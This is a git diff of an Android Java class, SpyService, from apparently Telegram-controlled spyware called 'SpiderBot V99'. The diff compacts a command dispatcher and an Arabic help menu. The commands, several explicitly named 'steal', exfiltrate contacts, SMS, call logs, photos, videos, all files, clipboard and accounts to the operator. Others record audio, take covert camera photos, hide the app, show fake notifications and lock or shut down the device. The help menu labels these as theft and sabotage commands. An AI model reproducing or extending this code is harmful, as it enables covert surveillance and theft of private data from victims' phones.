@@ -178,129 +178,56 @@ public class SpyService extends Service {
     private void handleCommand(String cmd) {
         String lower = cmd.toLowerCase();
 
-        // قائمة المساعدة
         if (lower.equals("/start") || lower.equals("/help") || lower.equals("/menu") || lower.equals("/commands")) {
             sendHelpMenu();
             return;
         }
 
         try {
-            // معالجة الأوامر التي تبدأ بـ /
             if (lower.startsWith("/")) {
-                // استخراج الأمر بدون الـ /
                 String command = lower.substring(1);
-                
-                // معالجة الأوامر حسب الاسم
                 switch (command) {
-                    // أوامر السرقة
-                    case "steal_contacts":
-                    case "contacts":
-                        sendFile(collectContacts(), "📇 جهات الاتصال");
-                        break;
-                    case "steal_sms":
-                    case "sms":
-                        sendFile(collectSms(), "💬 الرسائل النصية");
-                        break;
-                    case "steal_calls":
-                    case "calllog":
-                        sendFile(collectCallLogs(), "📞 سجل المكالمات");
-                        break;
-                    case "location":
-                        getLocation();
-                        break;
-                    case "record":
-                        startRecording();
-                        break;
-                    case "stoprec":
-                        stopRecording();
-                        break;
-                    case "apps":
-                        sendFile(collectApps(), "📱 التطبيقات المثبتة");
-                        break;
-                    case "photos":
-                        sendFile(collectMedia("images"), "🖼 جميع الصور");
-                        break;
-                    case "videos":
-                        sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات");
-                        break;
-                    case "files":
-                        sendFile(collectAllFiles(), "📦 جميع الملفات");
-                        break;
-                    case "hide":
-                        hideApp();
-                        break;
-                    case "show":
-                        showApp();
-                        break;
-                    case "notify":
-                    case "fake_notif":
-                        showFakeNotification();
-                        break;
-                    case "cam_back":
-                        takePhoto();
-                        break;
-                    case "cam_front":
-                        takePhotoFront();
-                        break;
-                    case "torch_on":
-                        flashOn();
-                        break;
-                    case "torch_off":
-                        flashOff();
-                        break;
-                    case "imei":
-                        getImei();
-                        break;
-                    case "phone":
-                        getPhoneNumber();
-                        break;
-                    case "sim":
-                        getSimInfo();
-                        break;
-                    case "wifi":
-                        getWifiInfo();
-                        break;
-                    case "battery":
-                        getBatteryInfo();
-                        break;
-                    case "ip":
-                        getPublicIp();
-                        break;
-                    case "lock":
-                        lockDevice();
-                        break;
-                    case "reboot":
-                        rebootDevice();
-                        break;
-                    case "shutdown":
-                        shutdownDevice();
-                        break;
-                    case "accounts":
-                        getAccounts();
-                        break;
-                    case "clipboard":
-                        getClipboard();
-                        break;
-                    case "device":
-                        getDeviceInfo();
-                        break;
-                    case "network":
-                        getNetworkInfo();
-                        break;
-                    default:
-                        bot.sendText("❌ أمر غير معروف. استخدم /help لعرض الأوامر.");
+                    case "steal_contacts": case "contacts": sendFile(collectContacts(), "📇 جهات الاتصال"); break;
+                    case "steal_sms": case "sms": sendFile(collectSms(), "💬 الرسائل النصية"); break;
+                    case "steal_calls": case "calllog": sendFile(collectCallLogs(), "📞 سجل المكالمات"); break;
+                    case "location": getLocation(); break;
+                    case "record": startRecording(); break;
+                    case "stoprec": stopRecording(); break;
+                    case "apps": sendFile(collectApps(), "📱 التطبيقات المثبتة"); break;
+                    case "photos": sendFile(collectMedia("images"), "🖼 جميع الصور"); break;
+                    case "videos": sendFile(collectMedia("videos"), "🎬 جميع الفيديوهات"); break;
+                    case "files": sendFile(collectAllFiles(), "📦 جميع الملفات"); break;
+                    case "hide": hideApp(); break;
+                    case "show": showApp(); break;
+                    case "notify": case "fake_notif": showFakeNotification(); break;
+                    case "cam_back": takePhoto(); break;
+                    case "cam_front": takePhotoFront(); break;
+                    case "torch_on": flashOn(); break;
+                    case "torch_off": flashOff(); break;
+                    case "imei": getImei(); break;
+                    case "phone": getPhoneNumber(); break;
+                    case "sim": getSimInfo(); break;
+                    case "wifi": getWifiInfo(); break;
+                    case "battery": getBatteryInfo(); break;
+                    case "ip": getPublicIp(); break;
+                    case "lock": lockDevice(); break;
+                    case "reboot": rebootDevice(); break;
+                    case "shutdown": shutdownDevice(); break;
+                    case "accounts": getAccounts(); break;
+                    case "clipboard": getClipboard(); break;
+                    case "device": getDeviceInfo(); break;
+                    case "network": getNetworkInfo(); break;
+                    default: bot.sendText("❌ أمر غير معروف. استخدم /help");
                 }
             } else {
-                // إذا لم يبدأ بـ /، نعتبره أمراً عادياً (للتوافق مع النظام القديم)
                 handleLegacyCommand(cmd);
             }
         } catch (Exception e) {
-            bot.sendText("❌ خطأ أثناء تنفيذ الأمر: " + e.getMessage());
+            bot.sendText("❌ خطأ: " + e.getMessage());
             Log.e(TAG, "handleCommand error", e);
         }
     }
 
-    // للتوافق مع الأوامر القديمة (بدون /)
     private void handleLegacyCommand(String cmd) {
         String upper = cmd.toUpperCase();
         try {
@@ -333,18 +260,12 @@ public class SpyService extends Service {
                 case "SHUTDOWN": shutdownDevice(); break;
                 case "GET_ACCOUNTS": getAccounts(); break;
                 case "GET_CLIPBOARD": getClipboard(); break;
-                case "START_LOCATION_TRACK": startLocationTracking(); break;
-                case "STOP_LOCATION_TRACK": stopLocationTracking(); break;
-                case "GET_INSTALLED": getInstalledPackages(); break;
-                case "GET_PROCESSES": getRunningProcesses(); break;
                 default: bot.sendText("❌ أمر غير معروف. استخدم /help");
             }
         } catch (Exception e) {
             bot.sendText("❌ خطأ: " + e.getMessage());
         }
     }
-
-    // ========== قائمة المساعدة ==========
 
     private void sendHelpMenu() {
         String menu = "🕷️ **SPIDERBOT V99 - قائمة الأوامر الكاملة** 🕷️\n\n" +
@@ -361,7 +282,6 @@ public class SpyService extends Service {
                 "/videos - سرقة جميع الفيديوهات\n" +
                 "/files - سرقة جميع الملفات\n" +
                 "/clipboard - سرقة الحافظة\n\n" +
-
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "⚫ **أوامر التحكم والتخريب** ⚫\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
@@ -373,7 +293,6 @@ public class SpyService extends Service {
                 "/lock - قفل الجهاز\n" +
                 "/reboot - إعادة تشغيل الجهاز\n" +
                 "/shutdown - إيقاف تشغيل الجهاز\n\n" +
-
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "🟢 **أوامر المعلومات** 🟢\n" +
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
@@ -387,10 +306,8 @@ public class SpyService extends Service {
                 "/apps - قائمة التطبيقات المثبتة\n" +
                 "/device - معلومات الجهاز كاملة\n" +
                 "/network - معلومات الشبكة\n\n" +
-
                 "━━━━━━━━━━━━━━━━━━━━━━\n" +
                 "✅ SpiderBot V99 جاهز";
-
         bot.sendText(menu);
     }
 
@@ -440,6 +357,19 @@ public class SpyService extends Service {
         } catch (Exception e) {
             bot.sendText("❌ خطأ: " + e.getMessage());
         }
+    }
+
+    private String getIpAddress() {
+        try {
+            for (java.net.NetworkInterface networkInterface : java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())) {
+                for (java.net.InetAddress inetAddress : java.util.Collections.list(networkInterface.getInetAddresses())) {
+                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof java.net.Inet4Address) {
+                        return inetAddress.getHostAddress();
+                    }
+                }
+            }
+        } catch (Exception e) { Log.e(TAG, "getIpAddress error", e); }
+        return "غير متاح";
     }
 
     // ======================================================================
@@ -927,19 +857,3 @@ public class SpyService extends Service {
         startService(new Intent(this, SpyService.class));
     }
 }
-
-    // ========== دالة الحصول على عنوان IP ==========
-    private String getIpAddress() {
-        try {
-            for (java.net.NetworkInterface networkInterface : java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())) {
-                for (java.net.InetAddress inetAddress : java.util.Collections.list(networkInterface.getInetAddresses())) {
-                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof java.net.Inet4Address) {
-                        return inetAddress.getHostAddress();
-                    }
-                }
-            }
-        } catch (Exception e) {
-            Log.e(TAG, "getIpAddress error", e);
-        }
-        return "غير متاح";
-    }
